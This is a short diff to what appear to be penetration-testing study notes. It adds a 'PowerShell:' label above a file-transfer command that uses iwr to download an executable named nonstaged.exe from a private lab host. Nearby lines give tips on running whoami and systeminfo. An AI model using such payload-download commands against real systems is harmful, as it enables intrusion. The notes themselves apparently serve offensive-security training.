@@ -5,6 +5,7 @@
 - If you cannot run executables like whoami, systeminfo; then go to `C:\Windows\system32` folder to run this commands, because they may not be on our `PATH`.
 
 # File Transfer
+PowerShell:
 ```
 iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
 ```
